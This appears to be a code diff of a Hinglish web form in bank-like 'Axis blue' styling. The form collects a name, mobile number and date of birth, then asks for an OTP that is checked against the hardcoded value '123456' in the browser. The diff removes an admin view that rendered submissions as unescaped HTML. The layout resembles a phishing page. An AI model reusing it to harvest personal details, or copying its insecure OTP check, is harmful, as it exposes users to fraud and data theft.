@@ -3,27 +3,81 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Simple Form - Live on Cloudflare</title>
+  <title>Form Submit</title>
   <style>
-    body { font-family: Arial, sans-serif; max-width: 600px; margin: 30px auto; padding: 20px; background: #f0f4f8; }
-    h1, h2 { color: #003087; text-align: center; } /* Axis blue */
-    form, #admin { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); margin-bottom: 25px; }
-    label { display: block; margin: 15px 0 6px; font-weight: bold; color: #333; }
-    input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
-    button { background: #003087; color: white; padding: 14px; border: none; border-radius: 6px; cursor: pointer; font-size: 18px; width: 100%; margin-top: 15px; }
+    body { 
+      font-family: Arial, sans-serif; 
+      background: #f0f4f8; 
+      margin: 0; 
+      padding: 15px; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      min-height: 100vh; 
+    }
+    .container { 
+      background: white; 
+      padding: 30px; 
+      border-radius: 12px; 
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1); 
+      width: 100%; 
+      max-width: 420px; 
+    }
+    h1 { 
+      text-align: center; 
+      color: #003087; 
+      margin-bottom: 25px; 
+    }
+    label { 
+      display: block; 
+      margin: 15px 0 6px; 
+      font-weight: bold; 
+      color: #333; 
+    }
+    input { 
+      width: 100%; 
+      padding: 12px; 
+      border: 1px solid #ccc; 
+      border-radius: 6px; 
+      box-sizing: border-box; 
+      font-size: 16px; 
+    }
+    button { 
+      width: 100%; 
+      padding: 14px; 
+      background: #003087; 
+      color: white; 
+      border: none; 
+      border-radius: 6px; 
+      font-size: 17px; 
+      cursor: pointer; 
+      margin-top: 15px; 
+    }
     button:hover { background: #002060; }
-    #toggle { background: #005566; margin-bottom: 20px; }
-    .entry { border-bottom: 1px solid #eee; padding: 12px 0; font-size: 15px; }
-    .entry strong { color: #003087; }
-    #list { min-height: 100px; }
+    #otp-section { display: none; margin-top: 30px; }
+    .success-msg { 
+      text-align: center; 
+      color: green; 
+      font-size: 18px; 
+      margin: 20px 0; 
+    }
+    .error-msg { 
+      text-align: center; 
+      color: red; 
+      font-size: 16px; 
+      margin: 10px 0; 
+    }
+    @media (max-width: 480px) {
+      .container { padding: 20px; }
+    }
   </style>
 </head>
 <body>
 
-  <button id="toggle">Admin View (Live Submissions) Dekho</button>
-
-  <div id="formView">
-    <h1>Apni Details Bharo</h1>
+  <div class="container">
+    <h1>Details Bharo</h1>
+    
+    <!-- Form Section -->
     <form id="myForm">
       <label>Full Name</label>
       <input type="text" id="name" required>
@@ -36,83 +90,76 @@
 
       <button type="submit">Submit Karo</button>
     </form>
-  </div>
 
-  <div id="adminView" style="display:none;">
-    <h2>Live Entries (Har 5 sec update hota hai)</h2>
-    <div id="list">Abhi koi entry nahi... Submit kar ke dekho!</div>
+    <!-- OTP Section (hidden by default) -->
+    <div id="otp-section">
+      <div class="success-msg">Submit ho gaya! Ab OTP verify karo</div>
+      <label>6-Digit OTP Daalo</label>
+      <input type="text" id="otp-input" maxlength="6" pattern="[0-9]{6}" placeholder="Enter OTP" required>
+      <button id="verify-btn">Verify OTP</button>
+      <p id="otp-error" class="error-msg" style="display:none;">Galat OTP! Dobara try karo.</p>
+    </div>
   </div>
 
   <script>
     const form = document.getElementById('myForm');
-    const toggle = document.getElementById('toggle');
-    const formView = document.getElementById('formView');
-    const adminView = document.getElementById('adminView');
-    const list = document.getElementById('list');
+    const otpSection = document.getElementById('otp-section');
+    const otpInput = document.getElementById('otp-input');
+    const verifyBtn = document.getElementById('verify-btn');
+    const otpError = document.getElementById('otp-error');
 
-    let pollingInterval = null;
+    // Fake OTP for testing (real mein backend se generate karna)
+    const FAKE_OTP = "123456";
 
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      const data = {
+
+      const payload = {
         name: document.getElementById('name').value.trim(),
         mobile: document.getElementById('mobile').value.trim(),
         dob: document.getElementById('dob').value,
-        time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+        time: new Date().toLocaleString('en-IN')
       };
 
       try {
         const res = await fetch('/api/submissions', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data)
+          body: JSON.stringify(payload)
         });
+
         if (res.ok) {
-          alert('Submit ho gaya bhai! ✅');
-          form.reset();
+          // Form hide karo, OTP section dikhao
+          form.style.display = 'none';
+          otpSection.style.display = 'block';
         } else {
-          alert('Kuch gadbad ho gayi, try again');
+          alert('Submit mein problem aayi, dobara try karo');
         }
       } catch (err) {
-        alert('Error: ' + err.message);
+        alert('Network error: ' + err.message);
       }
     });
 
-    toggle.addEventListener('click', () => {
-      if (formView.style.display !== 'none') {
-        formView.style.display = 'none';
-        adminView.style.display = 'block';
-        toggle.textContent = 'Form Bharne Wapas Jao';
-        loadData(); // pehli baar load
-        pollingInterval = setInterval(loadData, 5000); // har 5 sec
+    // OTP Verify button
+    verifyBtn.addEventListener('click', () => {
+      const enteredOtp = otpInput.value.trim();
+
+      if (enteredOtp === FAKE_OTP) {
+        otpError.style.display = 'none';
+        alert('OTP sahi hai! Verification complete ✅\nAb aapka data save ho gaya hai.');
+        // Optional: page reload ya thank you page dikha sakte ho
+        // location.reload();
       } else {
-        formView.style.display = 'block';
-        adminView.style.display = 'none';
-        toggle.textContent = 'Admin View (Live Submissions) Dekho';
-        if (pollingInterval) clearInterval(pollingInterval);
+        otpError.style.display = 'block';
       }
     });
 
-    async function loadData() {
-      try {
-        const res = await fetch('/api/submissions');
-        const subs = await res.json();
-        if (subs.length === 0) {
-          list.innerHTML = '<p>Abhi tak koi submission nahi aaya.</p>';
-        } else {
-          list.innerHTML = subs.map(s => `
-            <div class="entry">
-              <strong>Name:</strong> ${s.name}<br>
-              <strong>Mobile:</strong> ${s.mobile}<br>
-              <strong>DOB:</strong> ${s.dob}<br>
-              <small>${s.time}</small>
-            </div>
-          `).join('');
-        }
-      } catch (err) {
-        list.innerHTML = '<p>Error loading data...</p>';
+    // Enter key se verify
+    otpInput.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter') {
+        verifyBtn.click();
       }
-    }
+    });
   </script>
 </body>
 </html>
